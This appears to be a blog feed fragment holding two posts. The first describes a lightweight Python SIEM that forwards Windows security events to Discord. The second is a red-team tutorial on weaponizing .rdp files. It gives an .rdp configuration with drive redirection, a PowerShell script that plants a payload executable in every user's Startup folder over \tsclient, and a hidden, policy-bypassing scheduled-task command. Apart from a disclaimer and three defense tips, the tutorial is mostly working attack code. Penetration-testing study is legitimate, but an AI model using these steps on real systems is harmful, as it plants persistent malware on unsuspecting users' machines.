            <description>&lt;h2 id=&#34;-what-is-siem&#34;&gt;🧠 What is SIEM?&lt;/h2&gt;
&lt;p&gt;SIEM stands for Security Information and Event Management. It is a system that collects, analyzes, and correlates security event data from various sources — like operating systems, applications, and network devices — in real time.&lt;/p&gt;
&lt;p&gt;A SIEM helps:&lt;/p&gt;
&lt;p&gt;🔍 Detect suspicious activity and threats&lt;/p&gt;
&lt;p&gt;🧾 Maintain audit trails for compliance&lt;/p&gt;
&lt;p&gt;🚨 Alert security teams about incidents&lt;/p&gt;
&lt;p&gt;📊 Visualize security trends across systems&lt;/p&gt;
&lt;p&gt;Traditional enterprise SIEMs (like Splunk, QRadar, or Microsoft Sentinel) are powerful but often complex and expensive.&lt;/p&gt;</description>

<p>SIEM stands for Security Information and Event Management. It is a system that collects, analyzes, and correlates security event data from various sources — like operating systems, applications, and network devices — in real time.</p>
<p>A SIEM helps:</p>
<p>🔍 Detect suspicious activity and threats</p>
<p>🧾 Maintain audit trails for compliance</p>
<p>🚨 Alert security teams about incidents</p>
<p>📊 Visualize security trends across systems</p>
<p>Traditional enterprise SIEMs (like Splunk, QRadar, or Microsoft Sentinel) are powerful but often complex and expensive.</p>
<h2 id="-my-lightweight-python-siem">🐍 My Lightweight Python SIEM</h2>
<p>This project is a lightweight, beginner-friendly SIEM written in Python, focused specifically on Windows event monitoring. It covers high-value events such as:</p>
<p>✅ Successful and failed logins</p>
<p>👤 New user creation</p>
<p>🔑 Password changes/resets</p>
<p>📦 Application installations</p>
<p>🔌 USB device insertions</p>
<p>All critical events are parsed from the Windows Event Logs and pushed to a Discord channel using a webhook, so you can get real-time alerts without setting up a full SIEM stack.</p>
<h3 id="-technical-overview">🛠️ Technical Overview</h3>
<p>The tool leverages Python&rsquo;s capabilities to interact with Windows Event Logs, utilizing modules such as pywin32 for event log access and requests for sending HTTP POST requests to Discord webhooks. By parsing relevant event IDs, the tool identifies specific security-related activities and formats them into readable messages for Discord.</p>
<h3 id="-features">🔍 Features</h3>
<p>The SIEM tool focuses on detecting and alerting the following events:</p>
<ul>
<li>User Account Creation: Identifies when new user accounts are added.</li>
<li>Password Change Attempts: Monitors both successful and failed password change endeavors.</li>
<li>Successful and Failed Logons: Tracks user logon activities to detect unauthorized access attempts.</li>
<li>Password Resets: Alerts when passwords are reset, which could indicate potential security concerns.</li>
<li>Application Installations: Detects when new applications are installed, helping to prevent unauthorized software deployment.</li>
<li>USB Device Insertions: Monitors the insertion of USB devices, a common vector for data exfiltration or malware introduction.</li>
</ul>
<h3 id="-events-monitored">🔧 Events Monitored</h3>
<p>The tool listens to these Windows Event IDs:</p>
<table>
  <thead>
      <tr>
          <th>Event ID</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>4624</td>
          <td>Successful Logon</td>
      </tr>
      <tr>
          <td>4625</td>
          <td>Failed Logon</td>
      </tr>
      <tr>
          <td>4720</td>
          <td>User Account Created</td>
      </tr>
      <tr>
          <td>4723</td>
          <td>Password Change</td>
      </tr>
      <tr>
          <td>4724</td>
          <td>Password Reset</td>
      </tr>

          <td>11707</td>
          <td>Application Installed</td>
      </tr>
      <tr>
          <td>6416</td>
          <td>USB Device Inserted</td>
      </tr>
  </tbody>
</table>
<p>Each of these is tagged with an emoji in the Discord notification to improve readability.</p>
<h3 id="-real-time-notifications-with-discord">🔔 Real-Time Notifications with Discord</h3>
<p>The tool sends alerts using Discord webhooks. Each alert includes:</p>
<ul>
<li>Event type and ID</li>
<li>Time of occurrence</li>
<li>Source of the event</li>
</ul>
<p>Extracted details (e.g., account name, application, USB device)</p>
<h2 id="-getting-started">🚀 Getting Started</h2>
<p>To deploy the SIEM tool:</p>
<ol>
<li>
<p>Set Up Discord Webhook: Create a webhook in your desired Discord channel to receive alerts.</p>
</li>
<li>
<p>Configure the Tool: Input the webhook URL into the tool&rsquo;s configuration.</p>
</li>
<li>
<p>Run the Script: Execute the Python script with Administrative Privileges on the Windows machine.</p>
</li>
<li>
<p>Monitor Alerts: Security events will now be sent to your Discord channel in real-time.</p>
</li>
</ol>
<p>🛠️ Setting Up Windows Logging via Group Policy</p>
<p>To make sure these events are logged by Windows, configure Advanced Audit Policy Settings via Group Policy:</p>
<p>Open <code>gpedit.msc</code></p>
<p>Navigate to:</p>
<p>Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration</p>
<p>Enable the following:</p>
<ul>
<li>Logon/Logoff &gt; Audit Logon Events (Success/Failure)</li>
<li>Account Management &gt; Audit User Account Management (Success)</li>
<li>Object Access &gt; Audit Removable Storage (Success)</li>
<li>System &gt; Audit System Events</li>
<li>Privilege Use &gt; Audit Sensitive Privilege Use</li>
</ul>
<p>Apply and update policies with <code>gpupdate /force</code>.</p>

            <content type="html"><![CDATA[<h1 id="-weaponizing-rdp-files-for-initial-access--a-red-team-technique">🖥️ Weaponizing RDP Files for Initial Access – A Red Team Technique</h1>
<p><em>Disclaimer: This post is for educational and ethical red teaming purposes only.</em></p>
<hr>
<p>Remote Desktop Protocol (.RDP) files are often considered benign by end users and IT admins alike. But under the right circumstances, they can be weaponized to deliver payloads — an advanced technique often explored in controlled penetration testing environments.</p>
<p>In this post, we walk through the essentials of RDP file weaponization and automation using Task Scheduler and PowerShell.</p>
<hr>
<h2 id="-objective">🎯 Objective</h2>
<ul>
<li><strong>Abuse RDP file trust</strong> to gain initial access</li>
<li><strong>Automate payload execution</strong> when an RDP session is established</li>
<li><strong>Operate stealthily</strong> by using PowerShell and Windows Task Scheduler</li>
</ul>
<hr>
<h2 id="-step-1-crafting-the-rdp-file">🔧 Step 1: Crafting the <code>.rdp</code> File</h2>
<p>An <code>.RDP</code> file can be modified to connect to a specified IP while maintaining a typical user experience. Here&rsquo;s a sample configuration you can build upon:</p>
<pre tabindex="0"><code class="language-rdp" data-lang="rdp">full address:s:192.168.50.132
prompt for credentials:i:0
redirectclipboard:i:1
devicestoredirect:s:*
drivestoredirect:s:*
</code></pre><p>This enables clipboard access and device/drive redirection — which can be abused by attackers for lateral movement or persistence.</p>
<hr>
<h2 id="-step-2-powershell-payload-to-copy-a-binary-to-startup-folder">🧪 Step 2: PowerShell Payload to Copy a Binary to Startup Folder</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Users = Get-ChildItem -Path <span style="color:#e6db74">&#34;\\tsclient\C\Users&#34;</span> -Directory | Where-Object { $_.Name <span style="color:#f92672">-notlike</span> <span style="color:#e6db74">&#34;Public&#34;</span> <span style="color:#f92672">-and</span> $_.Name <span style="color:#f92672">-notlike</span> <span style="color:#e6db74">&#34;Default*&#34;</span> }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($User <span style="color:#66d9ef">in</span> $Users) {
</span></span><span style="display:flex;"><span>    $StartupPath = <span style="color:#e6db74">&#34;\\tsclient\C\Users\</span>$($User.Name)<span style="color:#e6db74">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span>
</span></span><span style="display:flex;"><span>    Copy-Item -Path <span style="color:#e6db74">&#34;C:\Users\admin\Documents\RDP-Exploit\hello.exe&#34;</span> -Destination $StartupPath -ErrorAction SilentlyContinue
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This script looks for user directories and places the payload (<code>hello.exe</code>) into their startup folder — ensuring it executes on their next login.</p>
<hr>
<h2 id="-step-3-automating-with-task-scheduler">⏲️ Step 3: Automating with Task Scheduler</h2>
<p>Set up a scheduled task that triggers upon a remote desktop connection. This allows code execution at the exact moment the target logs in.</p>
<h3 id="general-tab">General Tab</h3>
<ul>
<li>Name the task (e.g., <code>Updater</code>)</li>
<li>Run only when the user is logged in</li>
<li>Run with highest privileges</li>
</ul>
<p><img src="Pasted%20image%2020250120173230.png" alt=""></p>
<hr>
<h3 id="trigger-configuration">Trigger Configuration</h3>
<ul>
<li>Choose <code>On connection to user session</code></li>
<li>Target all users for broader coverage</li>
</ul>
<p><img src="Pasted%20image%2020250120173241.png" alt=""></p>
<hr>
<h3 id="action-configuration">Action Configuration</h3>
<p>Command:</p>
<pre tabindex="0"><code>powershell.exe -WindowStyle Hidden -Ep Bypass -c C:\Users\admin\Downloads\Hacking\RDP-Exploit\run.ps1
</code></pre><p>This ensures silent execution of your PowerShell script on login.</p>
<p><img src="Pasted%20image%2020250120173258.png" alt=""></p>
<hr>
<h2 id="-ethics--defense">⚠️ Ethics &amp; Defense</h2>
<p>This technique should <em>only</em> be practiced in lab environments with proper consent. Defenders can detect this with:</p>
<ul>
<li>PowerShell logging</li>
<li>Monitoring Task Scheduler activity</li>
<li>Inspecting <code>.RDP</code> files for unusual settings</li>
</ul>
<hr>
<h2 id="-final-thoughts">📌 Final Thoughts</h2>
<p>RDP files are often overlooked as attack vectors. Weaponizing them shows how even common administrative tools can be turned into attack surfaces when combined with automation.</p>
